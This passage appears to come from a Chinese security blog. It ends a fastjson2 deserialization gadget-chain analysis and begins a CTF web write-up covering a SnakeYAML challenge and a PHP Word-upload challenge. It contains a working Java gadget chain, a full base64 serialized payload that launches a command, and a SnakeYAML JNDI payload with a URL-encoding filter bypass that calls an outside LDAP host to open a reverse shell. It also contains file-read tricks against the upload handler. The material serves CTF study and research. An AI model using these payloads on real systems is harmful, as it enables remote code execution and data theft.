TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates, \u0026#34;_bytecodes\u0026#34;, code); setFieldValue(templates, \u0026#34;_name\u0026#34;, \u0026#34;fupanc\u0026#34;); setFieldValue(templates, \u0026#34;_class\u0026#34;, null); setFieldValue(templates, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Class\u0026lt;?\u0026gt; clazz = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;); Constructor\u0026lt;?\u0026gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templates); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;fupanc\u0026#34;, proxyObj); XString xstring = new XString(\u0026#34;text\u0026#34;); StyledEditorKit.AlignmentAction alignmentAction = new StyledEditorKit.AlignmentAction(\u0026#34;123\u0026#34;,1); alignmentAction.putValue(\u0026#34;Name\u0026#34;,null); alignmentAction.putValue(\u0026#34;fupanc1\u0026#34;,xstring); alignmentAction.putValue(\u0026#34;fupanc2\u0026#34;,jsonObject); //任意可序列化的类作为参数都行 HashMap hashMap = new HashMap(); SwingPropertyChangeSupport swingPropertyChangeSupport = new SwingPropertyChangeSupport(hashMap); setFieldValue(alignmentAction,\u0026#34;changeSupport\u0026#34;, swingPropertyChangeSupport); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(alignmentAction); out.close(); // ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); // in.readObject(); // in.close(); } public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception { Class\u0026lt;?\u0026gt; clazz = obj.getClass(); Field field = null; while (clazz != null) { try { field = clazz.getDeclaredField(fieldName); break; } catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); } } if (field == null) { throw new NoSuchFieldException(\u0026#34;Field \u0026#39;\u0026#34; + fieldName + \u0026#34;\u0026#39; not found in class hierarchy.\u0026#34;); } field.setAccessible(true); field.set(obj, value); } } 然后使用编辑器将生成的ser.ser文件的31改成32，即1=\u0026gt;2：\n然后就可以愉快的反序列化弹计算机了：\n是一个非常好的思路，还可以先正常生成两个键值对，然后再通过编辑器修改成想要的值，达到既定的效果。\n最后贴一个mac环境下的paylaod验证：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 package org.example; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.util.Base64; public class Main { public static void main(String[] args) throws Exception { // byte[] data = Files.readAllBytes(Paths.get(\u0026#34;ser.ser\u0026#34;)); // System.out.println(Base64.getEncoder().encodeToString(data)); String payload = \u0026#34;rO0ABXNyADBqYXZheC5zd2luZy50ZXh0LlN0eWxlZEVkaXRvcktpdCRBbGlnbm1lbnRBY3Rpb27M5wk51R8KdgIAAUkAAWF4cgAxamF2YXguc3dpbmcudGV4dC5TdHlsZWRFZGl0b3JLaXQkU3R5bGVkVGV4dEFjdGlvbkI5NbOb1VOkAgAAeHIAG2phdmF4LnN3aW5nLnRleHQuVGV4dEFjdGlvbgCrKNni9WB8AgAAeHIAGmphdmF4LnN3aW5nLkFic3RyYWN0QWN0aW9u1UAlM9YyWOUDAAJaAAdlbmFibGVkTAANY2hhbmdlU3VwcG9ydHQALkxqYXZheC9zd2luZy9ldmVudC9Td2luZ1Byb3BlcnR5Q2hhbmdlU3VwcG9ydDt4cAFzcgAsamF2YXguc3dpbmcuZXZlbnQuU3dpbmdQcm9wZXJ0eUNoYW5nZVN1cHBvcnRjZsI+j4MRjAIAAVoAC25vdGlmeU9uRURUeHIAIGphdmEuYmVhbnMuUHJvcGVydHlDaGFuZ2VTdXBwb3J0WNXSZFdIYLsDAANJACpwcm9wZXJ0eUNoYW5nZVN1cHBvcnRTZXJpYWxpemVkRGF0YVZlcnNpb25MAAhjaGlsZHJlbnQAFUxqYXZhL3V0aWwvSGFzaHRhYmxlO0wABnNvdXJjZXQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAnBzcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAAdwgAAAAQAAAAAHhweAB3BAAAAAJ0AAdmdXBhbmMyc3IAMWNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5vYmplY3RzLlhTdHJpbmccCic7SBbF/QIAAHhyADFjb20uc3VuLm9yZy5hcGFjaGUueHBhdGguaW50ZXJuYWwub2JqZWN0cy5YT2JqZWN09JgSCbt7thkCAAFMAAVtX29ianEAfgAJeHIALGNvbS5zdW4ub3JnLmFwYWNoZS54cGF0aC5pbnRlcm5hbC5FeHByZXNzaW9uB9mmHI2srNYCAAFMAAhtX3BhcmVudHQAMkxjb20vc3VuL29yZy9hcGFjaGUveHBhdGgvaW50ZXJuYWwvRXhwcmVzc2lvbk5vZGU7eHBwdAAEdGV4dHQAB2Z1cGFuYzJzcgAgY29tLmFsaWJhYmEuZmFzdGpzb24yLkpTT05PYmplY3QAAAAAAAAAAQIAAHhyABdqYXZhLnV0aWwuTGlua2VkSGFzaE1hcDTATlwQbMD7AgABWgALYWNjZXNzT3JkZXJ4cQB+AAs/QAAAAAAADHcIAAAAEAAAAAF0AAZmdXBhbmNzfQAAAAEAHWphdmF4LnhtbC50cmFuc2Zvcm0uVGVtcGxhdGVzeHIAF2phdmEubGFuZy5yZWZsZWN0LlByb3h54SfaIMwQQ8sCAAFMAAFodAAlTGphdmEvbGFuZy9yZWZsZWN0L0ludm9jYXRpb25IYW5kbGVyO3hwc3IANG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5KZGtEeW5hbWljQW9wUHJveHlMxLRxDuuW/AIABFoADWVxdWFsc0RlZmluZWRaAA9oYXNoQ29kZURlZmluZWRMAAdhZHZpc2VkdAAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL2ZyYW1ld29yay9BZHZpc2VkU3VwcG9ydDtbABFwcm94aWVkSW50ZXJmYWNlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwAABzcgAwb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWRTdXBwb3J0JMuKPPqkxXUCAAVaAAtwcmVGaWx0ZXJlZEwAE2Fkdmlzb3JDaGFpbkZhY3Rvcnl0ADdMb3JnL3NwcmluZ2ZyYW1ld29yay9hb3AvZnJhbWV3b3JrL0Fkdmlzb3JDaGFpbkZhY3Rvcnk7TAAIYWR2aXNvcnN0ABBMamF2YS91dGlsL0xpc3Q7TAAKaW50ZXJmYWNlc3EAfgAjTAAMdGFyZ2V0U291cmNldAAmTG9yZy9zcHJpbmdmcmFtZXdvcmsvYW9wL1RhcmdldFNvdXJjZTt4cgAtb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLlByb3h5Q29uZmlni0vz5qfg928CAAVaAAtleHBvc2VQcm94eVoABmZyb3plbloABm9wYXF1ZVoACG9wdGltaXplWgAQcHJveHlUYXJnZXRDbGFzc3hwAAAAAAAAc3IAPG9yZy5zcHJpbmdmcmFtZXdvcmsuYW9wLmZyYW1ld29yay5EZWZhdWx0QWR2aXNvckNoYWluRmFjdG9yeVTdZDfiTnH3AgAAeHBzcgATamF2YS51dGlsLkFycmF5TGlzdHiB0h2Zx2GdAwABSQAEc2l6ZXhwAAAAAHcEAAAAAHhzcQB+ACkAAAAAdwQAAAAAeHNyADRvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC50YXJnZXQuU2luZ2xldG9uVGFyZ2V0U291cmNlfVVu9cf4+roCAAFMAAZ0YXJnZXRxAH4ACXhwc3IAOmNvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRlbXBsYXRlc0ltcGwJV0/BbqyrMwMABkkADV9pbmRlbnROdW1iZXJJAA5fdHJhbnNsZXRJbmRleFsACl9ieXRlY29kZXN0AANbW0JbAAZfY2xhc3NxAH4AH0wABV9uYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAARX291dHB1dFByb3BlcnRpZXN0ABZMamF2YS91dGlsL1Byb3BlcnRpZXM7eHAAAAAA/////3VyAANbW0JL/RkVZ2fbNwIAAHhwAAAAAXVyAAJbQqzzF/gGCFTgAgAAeHAAAAGmyv66vgAAADQAGwEABEV2aWwHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQEACDxjbGluaXQ+AQADKClWAQAEQ29kZQEAEWphdmEvbGFuZy9SdW50aW1lBwAKAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwADAANCgALAA4BABJvcGVuIC1hIENhbGN1bGF0b3IIABABAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAASABMKAAsAFAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHABYBAAY8aW5pdD4MABgACAoAFwAZACEAAgAXAAAAAAACAAgABwAIAAEACQAAABYAAgAAAAAACrgADxIRtgAVV7EAAAAAAAEAGAAIAAEACQAAABEAAQABAAAABSq3ABqxAAAAAAABAAUAAAACAAZwcQB+ABhwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAA3ZyACNvcmcuc3ByaW5nZnJhbWV3b3JrLmFvcC5TcHJpbmdQcm94eQAAAAAAAAAAAAAAeHB2cgApb3JnLnNwcmluZ2ZyYW1ld29yay5hb3AuZnJhbWV3b3JrLkFkdmlzZWQAAAAAAAAAAAAAAHhwdnIAKG9yZy5zcHJpbmdmcmFtZXdvcmsuY29yZS5EZWNvcmF0aW5nUHJveHkAAAAAAAAAAAAAAHhweAB4AAAAAQ==\u0026#34;; ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(payload))); ois.readObject(); ois.close(); } } 参考文章：\nhttps://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q\nhttps://xz.aliyun.com/news/14333\nhttps://arthas.aliyun.com/doc/quick-start.html\nhttps://xz.aliyun.com/news/18467\n","date":"2025-08-21T18:42:45+08:00","permalink":"https://fupanc-w1n.github.io/p/fastjson2%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/","title":"fastjson2下的反序列化调用链分析"},{"content":"WEB 这次比赛虽然大部分都是国外的原题，但是都是我没做过的，这里就简单记录一下当时自己做过的并且有意思的题。\nEzYaml 感觉又是snakeyaml反序列化，下载拿到jar包后便编译，springboot，有如下依赖：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 - \u0026#34;BOOT-INF/lib/spring-boot-2.7.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-autoconfigure-2.7.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-classic-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/logback-core-1.2.11.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-to-slf4j-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/log4j-api-2.17.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jul-to-slf4j-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jakarta.annotation-api-1.3.5.jar\u0026#34; - \u0026#34;BOOT-INF/lib/snakeyaml-1.30.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-databind-2.13.4.2.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-annotations-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-core-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jdk8-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-datatype-jsr310-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/jackson-module-parameter-names-2.13.4.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-core-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-el-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/tomcat-embed-websocket-9.0.68.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-web-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-beans-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-webmvc-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-aop-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-context-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-expression-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/lombok-1.18.24.jar\u0026#34; - \u0026#34;BOOT-INF/lib/slf4j-api-1.7.36.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-core-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-jcl-5.3.23.jar\u0026#34; - \u0026#34;BOOT-INF/lib/spring-boot-jarmode-layertools-2.7.5.jar\u0026#34; 可以看到存在snakeyaml依赖，再看路由：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 @PostMapping({\u0026#34;/config\u0026#34;}) @ResponseBody public HashMap\u0026lt;String, String\u0026gt; config(String yaml) { HashMap\u0026lt;String, String\u0026gt; configMap = new HashMap\u0026lt;\u0026gt;(); if (!Common.isValid(yaml) || yaml.isEmpty()) { yaml = Common.exampleConfig; } Yaml parse = new Yaml(); Object config = parse.load(yaml); Method[] methods = config.getClass().getDeclaredMethods(); for (Method method : methods) { String name = method.getName(); if (name.startsWith(BeanUtil.PREFIX_GETTER_GET) \u0026amp;\u0026amp; method.getParameterCount() == 0 \u0026amp;\u0026amp; name.length() \u0026gt; 3) { try { configMap.put(name.substring(3), method.invoke(config, new Object[0]).toString()); } catch (Exception e) { } } } return configMap; } 可以看到存在snakeyaml反序列化漏洞，只不过对内容进行了检测，跟进自定义的Common类的isValid()方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 package com.ctf.yamlconfig.util; import org.springframework.beans.PropertyAccessor; /* loaded from: yaml.jar:BOOT-INF/classes/com/ctf/yamlconfig/util/Common.class */ public class Common { public static final String exampleConfig = \u0026#34;!!com.ctf.yamlconfig.config.DataSourceConfig {\\n host: 127.0.0.1,\\n port: 3306,\\n username: SilentE,\\n password: 123456,\\n database: Test,\\n type: mysql,\\n params: \\\u0026#34;characterEncoding=utf-8\u0026amp;serverTimezone=GMT\u0026amp;useUnicode=true\\\u0026#34;\\n}\u0026#34;; public static boolean isValid(String origin) { if (origin.contains(PropertyAccessor.PROPERTY_KEY_PREFIX) || origin.contains(\u0026#34;]\u0026#34;) || origin.contains(\u0026#34;ScriptEngineManager\u0026#34;) || origin.contains(\u0026#34;InputStream\u0026#34;) || origin.contains(\u0026#34;OutputStream\u0026#34;) || origin.contains(\u0026#34;JdbcRowSetImpl\u0026#34;) || origin.contains(\u0026#34;jndi\u0026#34;) || origin.contains(\u0026#34;javax.naming\u0026#34;)) { return false; } return true; } } 可以看到是过滤了我们比较常打的JdbcRowSetImpl和中括号，后面看wp是在传参时使用双重url编码绕过，不是很懂为什么，这里又没有ssrf所以不会再次url解码，难道是snakeyaml在load()时会自动url解码一次？这是一种特性？\n先打出flag，直接打jndi即可：\n1 !!com.sun.rowset.%25%34%61dbcRowSetImpl+{dataSourceName%3a+\u0026#34;ldap%3a//47.100.223.173%3a1389/Deserialize/Jackson/ReverseShell/47.100.223.173/2333\u0026#34;,+autoCommit%3a+true} 把J双重编码了：\njndi打jackson反序列化，过程不多说了，用的JndiMap工具，最后拿到flag的效果如下：\nflag如下：\n1 flag{zhuaWa_j1aWa_zh@Wa} ————————\n现在来简单调试一下过程：\n本地搭建好环境后开始调试：\n可以看到确实在此时只进行了一次url解码，故这里的J还保持着url编码的格式。然后就会进入正常的Yaml的load()部分：\n在漫长的调试中，最后找到了实现代码，在一次调试中，看到tag实现了已经解码的标签：\n此时的调用栈为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 parseNode:489, ParserImpl (org.yaml.snakeyaml.parser) access$1400:121, ParserImpl (org.yaml.snakeyaml.parser) produce:395, ParserImpl$ParseBlockNode (org.yaml.snakeyaml.parser) peekEvent:166, ParserImpl (org.yaml.snakeyaml.parser) peek:59, CommentEventsCollector$1 (org.yaml.snakeyaml.comments) peek:45, CommentEventsCollector$1 (org.yaml.snakeyaml.comments) collectEvents:140, CommentEventsCollector (org.yaml.snakeyaml.comments) collectEvents:119, CommentEventsCollector (org.yaml.snakeyaml.comments) composeNode:157, Composer (org.yaml.snakeyaml.composer) getNode:115, Composer (org.yaml.snakeyaml.composer) getSingleNode:142, Composer (org.yaml.snakeyaml.composer) getSingleData:151, BaseConstructor (org.yaml.snakeyaml.constructor) loadFromReader:491, Yaml (org.yaml.snakeyaml) load:416, Yaml (org.yaml.snakeyaml) 往前追溯tag的实现并打断点重新调试：\n这里是先从tagToken中获取value，然后再从中获取到suffix并拼接成为tag，并且可以看到此时的tagToken的变量的值已经解码了：\n跟进getValue()方法：\n这里打一个断点往前查看赋值情况： 可以看到对value的赋值以及TagToken的实例化，分析前面的代码，看到对suffix赋值调用了一个scanTagUri()方法，跟进查看：\n注释中有对这个scanTagUri()方法的说明：\n扫描标签中的URI，其实就是对其中进行了url编码的字符进行处理，这个方法的逻辑就是利用chunk来储存字符，当遇到%字符，也就是url编码了，就会先将前面累计的普通字符写入chunks，然后再写入url解码后的字符。关键点就在于上文标记出来的scanUriEscapes()方法：\n关键的解码的地方就是如下：\n1 2 byte code = (byte) Integer.parseInt(reader.prefix(2), 16); buff.put(code); 这里就是读取%后面两个十六进制字符，然后将其转换成字节，比如我这里的J就是%4a，那么就是0x4a，对应ascii就是J：\n后面再调用UriEncoder.decode将其解码成字符并返回，然后就放入到chunks中，最后调用chunks.toString()返回以字符串形式返回赋值：\n过程如上，所以我们可以对标签进行一次url编码，从而达到绕过的效果。\n————————————\n最后，值得一提的是虽然在参数传递时传入了startMark：\n但是但是主要起作用的还是直接从reader中获取的：\n方法定义如下：\n而reader存储的其实就是我们传入的参数：\n调用栈如下：\n1 2 3 4 5 6 7 8 9 10 11 12 scanTagUri:2291, ScannerImpl (org.yaml.snakeyaml.scanner) scanTag:1620, ScannerImpl (org.yaml.snakeyaml.scanner) fetchTag:995, ScannerImpl (org.yaml.snakeyaml.scanner) fetchMoreTokens:414, ScannerImpl (org.yaml.snakeyaml.scanner) checkToken:251, ScannerImpl (org.yaml.snakeyaml.scanner) produce:214, ParserImpl$ParseImplicitDocumentStart (org.yaml.snakeyaml.parser) peekEvent:166, ParserImpl (org.yaml.snakeyaml.parser) checkEvent:156, ParserImpl (org.yaml.snakeyaml.parser) getSingleNode:141, Composer (org.yaml.snakeyaml.composer) getSingleData:151, BaseConstructor (org.yaml.snakeyaml.constructor) loadFromReader:491, Yaml (org.yaml.snakeyaml) load:416, Yaml (org.yaml.snakeyaml) 后面发现这是一个trick：\nhttps://liotree.github.io/2025/02/09/spel%E6%B3%A8%E5%85%A5%E5%92%8Csnakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96waf%20bypass%20trick/\nEzReveal 给了附件，一个文件上传的页面，关键代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 \u0026lt;?php define(\u0026#39;REL_FILENAME\u0026#39;, \u0026#39;word/_rels/document.xml.rels\u0026#39;); function reSponYour($code, $msg) { http_response_code($code); die($msg); } /* sanity checks */ if ($_SERVER[\u0026#39;REQUEST_METHOD\u0026#39;] !== \u0026#39;POST\u0026#39;) reSponYour(405, \u0026#39;Invalid request method.\u0026#39;); if (!isset($_FILES[\u0026#39;input\u0026#39;])) reSponYour(400, \u0026#39;Please upload a file.\u0026#39;); if (isset($_FILES[\u0026#39;input\u0026#39;]) \u0026amp;\u0026amp; $_FILES[\u0026#39;input\u0026#39;][\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) reSponYour(500, \u0026#39;Upload error.\u0026#39;); if ($_FILES[\u0026#39;input\u0026#39;][\u0026#39;type\u0026#39;] != \u0026#39;application/vnd.openxmlformats-officedocument.wordprocessingml.document\u0026#39;) reSponYour(400, \u0026#39;Please upload a Word document!\u0026#39;); /* processing uploaded Word - valid document contains relationship table */ $zip = new ZipArchive(); $zipFilename = $_FILES[\u0026#39;input\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($zip-\u0026gt;open($zipFilename) !== true || $zip-\u0026gt;locateName(REL_FILENAME) === false) reSponYour(400, \u0026#39;File is not a valid Word document.\u0026#39;); $relsDom = simplexml_load_string($zip-\u0026gt;getFromName(REL_FILENAME)); if ($relsDom === false) reSponYour(400, \u0026#39;Invalid object relationship table. Document may be corrupted.\u0026#39;); /* extract document\u0026#39;s \u0026#34;media\u0026#34; folder into a temporary directory */ $tmpDir = exec(\u0026#34;mktemp -d --tmpdir=/tmp/ zipXXXXXX\u0026#34;); shell_exec(\u0026#34;unzip $zipFilename \\\u0026#34;word/media*\\\u0026#34; -d \\\u0026#34;$tmpDir\\\u0026#34;\u0026#34;); function cleanup($tmpDir) { shell_exec(\u0026#34;rm -rf $tmpDir\u0026#34;); } register_shutdown_function(\u0026#39;cleanup\u0026#39;, $tmpDir); // cleanup in the end chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; } } // cleanup system(\u0026#34;rm -rf $tmpDir\u0026#34;); ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;title\u0026gt;zStego - Results\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;./bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-light\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container text-center mt-5\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;display-4\u0026#34;\u0026gt;Scan Results\u0026lt;/h1\u0026gt; \u0026lt;?php if (!empty($messages)): ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-success mt-4\u0026#34;\u0026gt; \u0026lt;h4\u0026gt;Hidden Messages Found:\u0026lt;/h4\u0026gt; \u0026lt;ul class=\u0026#34;list-group\u0026#34;\u0026gt; \u0026lt;?php foreach ($messages as $message): ?\u0026gt; \u0026lt;li class=\u0026#34;list-group-item\u0026#34;\u0026gt; \u0026lt;?= htmlspecialchars($message) ?\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;?php endforeach; ?\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php else: ?\u0026gt; \u0026lt;div class=\u0026#34;alert alert-info mt-4\u0026#34;\u0026gt;No hidden messages found.\u0026lt;/div\u0026gt; \u0026lt;?php endif; ?\u0026gt; \u0026lt;a href=\u0026#34;index.php\u0026#34; class=\u0026#34;btn btn-secondary mt-3\u0026#34;\u0026gt;Back to Home\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 主要代码逻辑可以看到是如上的，是一个处理文件上传的代码逻辑，从中可以看到对文件上传的包进行了一些处理，比如要求为POST传参，需要input变量并且要求上传的文件的Content-Type需要为application/vnd.openxmlformats-officedocument.wordprocessingml.document，也就是word文档的内容，再看后续逻辑：\n1 2 3 4 5 6 7 8 $zip = new ZipArchive(); $zipFilename = $_FILES[\u0026#39;input\u0026#39;][\u0026#39;tmp_name\u0026#39;]; if ($zip-\u0026gt;open($zipFilename) !== true || $zip-\u0026gt;locateName(REL_FILENAME) === false) reSponYour(400, \u0026#39;File is not a valid Word document.\u0026#39;); $relsDom = simplexml_load_string($zip-\u0026gt;getFromName(REL_FILENAME)); if ($relsDom === false) reSponYour(400, \u0026#39;Invalid object relationship table. Document may be corrupted.\u0026#39;); 可以看到使用了ZipArchive()来对上传的word文档进行解压，并且做过misc的都知道，word文档都是可以改成zip然后解压查看内容的，所以这里很合理，但是同样催生出一个东西，我们可以上传zip文件，抓包修改type为指定内容即可。\n然后可以看到调用了locateName()要求解压后的文件包含word/_rels/document.xml.rels文件，这个可以在我们自定义在zip包中压缩一个即可，然后对document.xml.rels文件内容调用了simplexml_load_string()进行了处理，最开始以为这里考的一个xxe，但是从后面的代码逻辑看起来发现并不是。\n再往后面看就是创建了一个临时目录，然后调用unzip将上传的文件的word/media目录下的文件解压到临时目录下：\n1 2 3 4 5 6 7 $tmpDir = exec(\u0026#34;mktemp -d --tmpdir=/tmp/ zipXXXXXX\u0026#34;); shell_exec(\u0026#34;unzip $zipFilename \\\u0026#34;word/media*\\\u0026#34; -d \\\u0026#34;$tmpDir\\\u0026#34;\u0026#34;); function cleanup($tmpDir) { shell_exec(\u0026#34;rm -rf $tmpDir\u0026#34;); } register_shutdown_function(\u0026#39;cleanup\u0026#39;, $tmpDir); // cleanup in the end chdir(\u0026#34;$tmpDir/word/media\u0026#34;); ini_set(\u0026#39;open_basedir\u0026#39;, \u0026#39;.\u0026#39;); 然后进入对应目录并设置了open_basedir。在这里是直接对zip进行的解压缩的，所以不可避免的就是存在一个软链接漏洞，并且从这里的要求可以看出也需要上传的zip文件中存在word/media目录，然后最关键的处理如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $messages = []; foreach($relsDom-\u0026gt;Relationship as $rel) { if($rel[\u0026#39;Type\u0026#39;] == \u0026#39;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#39;) { if (!str_starts_with($rel[\u0026#39;Target\u0026#39;], \u0026#39;media/\u0026#39;)) continue; $filename = substr($rel[\u0026#39;Target\u0026#39;], 6); $file = @file_get_contents($filename); if ($file === false) // Object relationship table points to inexistent file. Document may be corrupted break; $result = @zlib_decode($file); // This will expose them hackers! if ($result !== false) $messages[] = $result; } } // cleanup system(\u0026#34;rm -rf $tmpDir\u0026#34;); 这里对我们前面获取到的word/_rels/document.xml.rels文件内容进行了处理，可以看到需要满足一些条件，这个我们直接让ai给出即可：\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media/hack.png\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; 这样就符合前面的if条件，然后可以看到存在漏洞点的是file_get_contents()函数，并且从给的提示或者dockerfile中可以看到是需要读取根目录下的flag.txt，然后参数来源就是上述的Target的值，调用了substr()函数来借去了media/后的内容，所以我们可以尝试如下控制文件内容：\n1 2 3 4 5 6 7 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt; \u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/image\u0026#34; Target=\u0026#34;media//etc/passwd\u0026#34;/\u0026gt; \u0026lt;/Relationships\u0026gt; 从而可以达到文件控制要读取的文件的文件名称，但是在后面读取完了后，又调用了@zlib_decode()来进行解压缩，成功解压缩才会将其赋值给$messages，从而输出到前端，怎么解决呢，注意file_get_contents()这是一个文件包含函数，并且参数可控，最有名的是什么，php fileter，是的，我们可以使用php伪协议先将其压缩一遍，然后这里再进行解压缩的时候就可以正常输出，可以本地尝试一下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 